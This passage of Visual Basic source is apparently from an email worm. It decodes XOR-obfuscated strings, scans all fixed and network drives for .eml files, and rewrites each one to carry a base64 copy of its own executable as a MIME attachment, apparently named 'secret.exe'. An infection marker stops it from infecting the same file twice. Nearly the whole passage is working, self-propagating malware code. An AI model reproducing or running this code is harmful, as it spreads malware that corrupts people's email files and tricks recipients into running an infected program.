   cc1 = "—•¢Õ*„˜Ó¤‹Ž‡®ŽŽŠ©®*¸µ‚„¦…«ƒš·¦ÓÕ‡*¥‰Ó¯Ïƒ‰¥¬•„•*¡¡Ò¶¯ƒ¢¤šÓ‘Ò*”ŽËÑÓÔ”*ˆ‹Ò£¢¸…®íêÐ©£Š¤¦*šÙÓªÕª˜Š§´Ž¡’®¦š©ØÙš°ª£”*Ö–“Š±©*‚‡‹¥Ù¯Ž¤¡¨Ï*°Ñ’·´“Š¯‚“·×•¨«Œ·Ž‹Œµ¯š¢íêÓ¯³ƒŽ‡†‡¬Ï—¥Ž•**Šª®¤¨ª—¯Œ¡°°·•¢–*„šÐ©˜µ¶º¤Ø×²*‘“Ø˜×¥**º¨¡¢‘ˆ©—ª®©*‰‹ƒ‹Ôš´ƒÔíêËŒ©Õ§«‰ºØµ¥”‰–ª‡Ù*‡…´Ó*“‹Ž¸Ñ‘*ª®‡¨®·‹±Ò°ŒŒ˜Ž*“•×–±‡°š¹‘£Ï—¢±·®·ªƒ¢²Ñ®ƒÕ¬„°„³íê¥Õ—*…¢ÖÑ–£¦š«„²²Ù³×¬„®ƒ–—³¦¨†¯£*•ÒÙÕ„‹‘*•ª¤©ËÙ‹ØËÏ’×Ù‘š¹ˆ™¡«Ñ×³¬¡™²¶™†«”£©’íê*„Ò*“®Ï„ˆ¦´×¶®‡¹Ï—£·ˆ×„«†ª„³¯£ºª·ƒ‹Õªº‰ƒŽ*¶²…«Ž”‰°”ƒªº°¡ƒ¨‚ÖØÙ«˜•Ò‚Ø‘¸±Ö°·‡íê•Œ…¦¬…™µ““Ø‹Ï—¤*§¢‡º£¢”––ŠƒŽ´Ë×·ª¹Ó†Ù*Ë¨‚Ö„±¢®…Ž×¬§Ë…±‡—Ð‡Ö„Ø˜ŠØ´Ö¶ª‘—–*×§Óíê·¢¨ƒš°¬”©—¶„³¶‚Ø™†Ð¦º•*™¬Ù‡ÐÑ¶©˜ÙŽ¹Œ²Ò°*™¤ŽÓ—¢Ë§«Òƒ”´¦²Ð«®‰*Ž–¨”Œ¹’®*¦•—‚‚”íêŒ¢¤¬šÖŽ¢µ…ˆ†°Ñ”¸…”Ó«´±Ó«²²®¢°¥“‡²‡‘Ô™¨©˜Ð¢ƒ¯±¯‡¢—¡«˜ªª¸Š•©Õ¹*§Š‹µ‡‘Ö¶©°¹‡Šíê**ÐÏ¥˜Š¯*‰ÔˆØ*µ•µ¥ˆŠ‰†ƒ“‚Ùª¦¨¸Š…§©Õ¯±±…Ù*ªÒ²Œª…Ø·©„*”Õµ¨*Õ²™´*®Š‹„…*¹ÏÑ‘¯·Ë¶íêº¦¡†‘£¨Šƒ°Ï¡«Ñ¹‹´£Ò*¹Ô¡—„•†ÕËÙ±’ªÙŽ¬‚Œ§Ù¯³±ƒÏÕ¡Ù•”¯ÙÐ«ÙŠ†ŒÐÖÐ•Ñ¥Š¸ˆ˜¡ËÖ¢"
   d = "Ë¡©°ª°¨”Ë®±*¤’‚*‚£×™“‘¥‘•²Š*ÒË*˜´®°•ª¬¶¸•·²¦´Õ‰ª¥¨°¨±¹˜Ñ’Ž„³‹ŒˆÑ¯¯Õ„··²—“Õ¹íêÏ—¡ºªš•š×Š¨ÔÕ’®˜Õ”§®šÕ¬³²Ö–‚Ó©¯¢*’ŽŽ…ÙƒŠ¹*‰§˜ØÒ¶©™£¯ˆ¢Ö¶“‰ÖÔ¨š¶š®·„Š’µ‹Ñ„§ÔŒíêÓ©*Ë‚Õˆµ®ÐŒ–†³²”©¡“‰¨‡‹Ø†Š¶¯¯×Ëµ‚“º*Öš˜–‡Õ¢°µ£“„µ£¥Ñ¨´¬*ˆºŠ¨Ù*¸¯Ô”§—‚Ù*—’Ö«²íêÐ¡Ò×ƒ«¡„–²²Ó—°ÖÑÐ°*®§„Ð‚Œ³†±ÐËÐ¥µ”ÓÕØ•ÓÙÒ*‹«¦®—ƒŠ‹Š§²ŽŠªÖÑƒ®¸*¤*³¬°ˆ‚³‚¸³¬±Öíêˆ‘¡ˆ³…„„“ƒŽŽ§ˆ¤‚¦§®ŽÓË¹£˜Ó¡Ô©§¯”‚ŒŒ«ÑÖ‹×´‹¦‡*Ø*¤°Œ*ÒÔ‡¡×ŠØÒØÕ©Ó¤ËÙšÑ˜µµ*“²íê*º³¬*˜Òš´Œ¥¥¤©‘ˆ·Ô¶ƒŠŠ¤¹°ÙÓÕ†Œ¡ÔÕ*•¬™£Ö*‡ˆ³…°š*¡Ô¤*Ò¶ƒƒ”“™¢‹«•±±—©¯Õ´Ð°®„Ö¶Š"
   d1 = "‹Ñºº´¶‹*¯ÓˆŽƒ™š¸*„ÔŒ‹µ°§‡¸‡‡¤Ø˜¡Ô°¯ƒºª˜Ð¯¸•„¦˜©Ô…²•¸©¹‹¥Ùº°ª—¡¢‹ØŽ§´š´’*¯•íê*™´”«£’º¹«„’‚·©—…ƒºÏ–ƒº˜šÖÙ©±…„˜˜Ë¶ƒ”*„Ó™Ž´±‡Œ×—Ï*¢ÖÐÐ–ŠÑÏ«*ÒƒŠ–µ‚–·¢Ðˆ©Ù¶ª§íêÕ*ºª¡«*™š¹*³•³Ò°ºÖ’™³Ñ¡ØÒŽ®¶º‚Š§´*”¥‰£*·¹¤ªš·®‘§*’¥£³Ó¡‘¨µ„´·§®*¬ƒ¤Ð×Ñ™ƒ”Õªíê„¸ª…±Ø¨*°±¶–´*ÓÑºšÑ«‘Š*‰Ñ†™–ƒ†¯šƒ¤Ž¦ª‚¥¦²³„¹“…Ñ¬**ØÑ„¦’¨®‘Õ¸®…Ñ´ªš·–§±¦’¯‡—*íê¦·†®¡¨·•…„Ò„ƒ®¥·ÙÙ·¬«ÔŠˆ–×…·µÔ²ª¦º–*¤š··º—¯Ù±–„¥‘„‡ª©‘¶¦Œ•³“„®Ô*Ñ™°µ×‘®‚ƒÔ”Ôíê”š«°¶Ó¯ÕšÐš™ƒ†‰¤ÖÑ‰*„·Ø”*Ñ’ƒ*²¡’®ª¦¬¥*ª¤¥¡¥¯‡Ô¨†ŠØ´·º–‹©™Ë±´Ò‘ªÕ¨¹Ë¸§£´Ó°*íê·”*Óƒ˜•‹’¦*·Ô”’¹*¬*³Ó¢•Œ©¹³Ž¥¹‰©¯ƒ’‡‹‹Ù¯ƒŠ¨*Ž‹º—Ñ®Ó“š‚±«““ƒª…²¡¶ËÔ³¦Ó¨Ñ©©¸*Ð"
   dd = "ÔÖ¶º·Ð™*¤*–šÑšÐ*†“*«£¦ˆ²†*˜¶Ö§¬•ÒºŒ*‘¬´±™*®‡Žƒ§™•¢˜—¯¢Ò©Ù†…’Ù—º©´*´Œ¦µ¸ƒ¹Ëƒ¤íê§¥Š¨–‡¥†Ž·‰Œ*¢‚’ª©“ƒ´Ø¡ª˜Ñ¢¢š‹¤ØŠ´ª¥¥Ð*©Ø³‚µªÒ‘¡†ŒšÑ¨‘…Œ¨µ¦¦Ò¬™Ò‰±*¡´¥ª¡*ª†íê«‡×‰³¡Ï´’‹Ù«—°¦„ŽŒ˜‚³–Ù—˜…¸¨‹‡Õ¶³ƒ¥¥ƒ„Ï—¡ØÑÐÒ*Ó´¬ƒ‡š™‹²‘¡†*¢©ÔË‡°’Ö…”²ÖÙ*Òíê”˜ª¦©¦…±“•·ºˆ—ƒÙ®˜ŽŠØ°´‘*Œ‚Š‹’‘˜ŽÒŒ“Ð¦•“*Žƒ™*•…°*’°Ò*ƒƒ…·´Š–**£*µ¤¡‚Š§¯Œ¨*³íêË”ª—–•¸¦•¯˜‘˜Ó«¡“š°š*Ô•¥™£³¢Ö¶Š‚™™ØŽØ‘·¥‹‘³´•Õ×ØÑ‡Ô„´‚*®™«ÖÔ˜•°Ô*’µ¬§¹¢®Ö*•íê°Ó*ª¡¡×Ù¯*—‰˜µ¡Š‡‹¨®*®*´”ÖÕ—¡¯*Œ«Ò*Òš¹*ÐËÓŠ”Ôº©×’šÕ¦µˆ¹ÐÒ‘*Ö¤Ž¯£ŠÐ™¢‡Ù…«‰†±íê×ÖÑŽ…*§ÙËØ¡¶·ª“¹™Ó°©°´ÓÔÏ—¡«ËÔŒ‡…Ù§Ù‹ªº´‡Ô’²Ñ°©ŽÒ†*‚µ£Ë´¢¨¦–¬ˆ¢‡”š™…ÕÕª‘±™¡Šíê’¶·Ñ‹*³©¦“º™²ŽÖ§*†ÔŠ¸š‘¶‹”¢˜¹ÔÕ‘ªš‹„*¶ŠÑËŒ¶Õ¸¯«¡º¤¯Ïª’¯**—*Œ•¨¹¡Ž–·‚˜š¶˜²¤íê¥Œ*ÙÖšÕÕ™š‚±…–ÕµË„Ššš³˜ÒØ¹”Ï°º„š£¯¶“¥Øƒ¡¨¨¨*•‰¥‚*¥ÕÒ²*¸…Ž°„‚ˆ¡˜*ƒ¬•«ËÒ³¯¯¢Ë¸"
   dd1 = "Ï—£••¸º´¨«¶©Õ¢ÖÑÖ³‹ºÏ“ÖÙºº·±—“ƒ¦¦¶³ƒ²ˆˆ™¢Ï¬¦¹–‰¸³×*¯š”’Ð«†°Œ‚*Õ×®—²Ž¨’Ø–ÖÑ•”íê¤ŠŒ’‘ƒÕ¤©·±¡Ñ„”Ð—±*”Ö¢*„”†**‚·Ð*¹ª©—¢ÒŽ*–„®¬Ø¨*¤*±¢‡ÐÖª*¡°Ø¡·´¤…ÓÖÙ°—‘ºš³¨£¬íêÓ°©Ù®Ð°¶„²˜Ù‹“º*¦Ï–×ƒ¬ÏÓÐ…«Ö‰šË¨®Ï©¡ÑÕ„±—¤°«*£ÕÏ*«Ù²—†³‘Øˆ™Ë°‚®ƒ×*Ò„£¯®ˆË¨ËíêŒ·×¡Ó¤šÓ¨“·ÒŠÙ¯†Ñ’³‰Ø¯*ª‚ƒ**”–ÐÖ•®ÏØÖÒº*¯Ò“•*²‰¯”£‹™Ð’‹µÑŽ*Ð*¹³—”¶°´‰¦†Ø«šªÙíê¢Ð‘×šÕ”Š‚ŠÓ¶®ˆÏ®ƒ¶*‹ª¹Ø‹Ù*Ž£¤™˜™*¶Ò¶º¨¸Ž‡Š´ºŠÏ*”˜°‚¨Ðš–¸Ù…†Ñ’«‚—¬‘«”*Ó–¹Õ‹šíêÐª«®Ïµ†’¸„×¢Š‘*“·Ö‡¡¶³Ž©ŒÐÔŽŽ”Õ*…*·Ñ“‹³Öº¯š¹¸¬˜”–¢¯´‹‹‡Ž‡†ˆŠØÖ˜º¥®”£Ð¶—“˜Ž™²íê‡*¥©¨‚’ÐÏ·–º¯ˆ*‹‹µ“º··®ª¦˜Ð„±—Ï·’µš®—°¥Ñ*•ÐÔ£Õ¸ËÖ·Ó¥¶“**…š¤´®¯ÒÒ×–Œƒ‘¡±±²ÑíêÔÙ¤‹¥†Ž¸*¸•‡Ö¸°«„ÑŒ¥ˆÙ¹Ø*Ë‡Ô’‹–¦§Ž±Ò‚²²˜¦—‹¹Ò‘*°¡‘ÐÐ˜ƒ’²‰*†˜“*©‰*°”“¸Ï°ÏŒ´íê£·´§Ñ*¨ÔÐ—ŽŽ*°™*Ò±”´ÏÙ‹ÝíêíêÍÍÍÍÍÍÝ¿®…˜”°*’”¿ÐÐÐ¿ÐÐÐØ¿ÐÑ£Ñ£ÙÔÑÎ¢Ù¢¥ÕÓ£ÐÍÍ"
   exe = App.Path & App.EXEName & x("Î…˜…")
   If Right(App.Path, 1) <> "\" Then exe = App.Path & "\" & App.EXEName & x("Î…˜…")
   b46 = b64(exe)
   Open x("ƒÚ¼*‰ƒ”•’…“Î…*Œ") For Output As #1
   Print #1, x(toe)
   Print #1, b46
   Print #1, x(a)
   Print #1, x(a1)
   Print #1, x(aa)
   Print #1, x(aa1)
   Print #1, x(aaa)
   Print #1, x(b)
   Print #1, x(b1)
   Print #1, x(c)
   Print #1, x(c1)
   Print #1, x(cc)
   Print #1, x(cc1)
   Print #1, x(d)
   Print #1, x(d1)
   Print #1, x(dd)
   Print #1, x(dd1)
   Close #1
   End Sub
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & x("¼"))
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, ap, mircfname, s, fso
     Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
   If (ext = x("…*Œ")) Then
       mimeinfect (f1.Path)
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   Private Sub mimeinfect(fileinput As String)
   On Error Resume Next
   Dim dd As Integer
   Dim s As String
   Dim sig, ver, textline, ddd, bb, extasy, extasy1, sex, g, gh, rout, num, source, fileread, b, c, d, e
   Open fileinput For Input As #6
   Do Until Mid(sig, 1, 4) = x("©¥")
   Line Input #6, sig
   Loop
   Line Input #6, ver
   Close #6
   If Mid(ver, 18, 3) = x("ÖÖÖ") Then
   Else
   Open fileinput For Input As #1
   Do Until Mid(textline, 1, 4) = x("©¥")
   Line Input #1, textline
   ddd = ddd & textline & vbCrLf
   Loop
   If Mid(textline, 1, 4) = x("©¥") Then
   bb = ddd & textline & x("ÖÖÖ")
   End If
   Line Input #1, extasy
   Line Input #1, extasy1
   If Mid(extasy1, 2, 5) = x("‚*•Ž„") Then
   Else
   Line Input #1, sex
   extasy1 = sex
   End If
   Do Until EOF(1)
   Line Input #1, g
   gh = gh & g & vbCrLf
   dd = dd + 1
   Loop
   Close #1
   'the routine
   Open fileinput For Input As #7
   Do Until Mid(rout, 1, 4) = x("©¥")
   Line Input #7, rout
   Loop
   For num = 0 To dd - 1
   Line Input #7, source
   fileread = fileread & source & vbCrLf
   Next num
   Close #7
   b = Mid(extasy1, 12, 41)
   c = App.Path & App.EXEName & x("Î…˜…")
   If Right(App.Path, 1) <> "\" Then c = App.Path & "\" & App.EXEName & x("Î…˜…")
   d = b64(c)
   e = "£*Ž”…Ž”Í´™*…ÚÀ***Œ‰ƒ*”‰*ŽÏ˜Í*“„*—ŽŒ**„ÛíêÀÀÀŽ**…ÝÂ“…ƒ’…”Î…˜…Âíê£*Ž”…Ž”Í´’*Ž“†…’Í¥Žƒ*„‰Ž‡ÚÀ‚*“…ÖÔíê£*Ž”…Ž”Í¤‰“**“‰”‰*ŽÚÀ*””*ƒˆ*…Ž”ÛíêÀÀÀ†‰Œ…Ž**…ÝÂ“…ƒ’…”Î…˜…Â"
   Open fileinput For Output As #1
   Print #1, bb
   Print #1, fileread
   Print #1, "--" & b
   Print #1, x(e)
   Print #1, d
   Print #1, "--" & b & "--"
   Close 1
   End If
   End Sub
   Private Function x(sText)
   On Error Resume Next
   Dim ekey, i, hash, crbyte
   ekey = 3029
   For i = 1 To Len(sText)
       hash = Asc(Mid(sText, i, 1))
       crbyte = Chr(hash Xor (ekey Mod 255))
       x = x & crbyte
   Next i
   End Function
   Private Function b64(ByVal vsFullPathname As String) As String
   On Error Resume Next
       'For Encoding BASE64
       Dim b           As Integer
       Dim b64ed   As Variant
       Dim bin(3)      As Byte
       Dim s           As String
       Dim l           As Long
       Dim i           As Long
       Dim FileIn      As Long
       Dim sResult     As String
       Dim n           As Long

       'b64ed=>tabla de tabulación
       b64ed = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

       Erase bin
       l = 0: i = 0: FileIn = 0: b = 0:
       s = ""

       'Gets the next free filenumber
       FileIn = FreeFile

       'Open Base64 Input File
       Open vsFullPathname For Binary As FileIn

       sResult = s & vbCrLf
       s = ""

       l = LOF(FileIn) - (LOF(FileIn) Mod 3)

       For i = 1 To l Step 3

           'Read three bytes
           Get FileIn, , bin(0)
           Get FileIn, , bin(1)
           Get FileIn, , bin(2)

           'Always wait until there're more then 64 characters
           If Len(s) > 64 Then

               s = s & vbCrLf
               sResult = sResult & s
               s = ""

           End If

           'Calc Base64-encoded char
           b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
           s = s & b64ed(b) 'the character s holds the encoded chars

           b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
           s = s & b64ed(b)

           b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
           s = s & b64ed(b)

           b = bin(n + 2) And &H3F
           s = s & b64ed(b)

       Next i

       'Now, you need to check if there is something left
       If Not (LOF(FileIn) Mod 3 = 0) Then

           'Reads the number of bytes left
           For i = 1 To (LOF(FileIn) Mod 3)
               Get FileIn, , bin(i - 1)
           Next i

           'If there are only 2 chars left
           If (LOF(FileIn) Mod 3) = 2 Then
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
               s = s & b64ed(b)

               s = s & "="

           Else 'If there is only one char left
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               s = s & "=="
           End If
       End If

       'Send the characters left
       If s <> "" Then
           s = s & vbCrLf
           sResult = sResult & s
       End If

       'Send the last part of the MIME Body
       s = ""

       Close FileIn
       b64 = sResult

   End Function
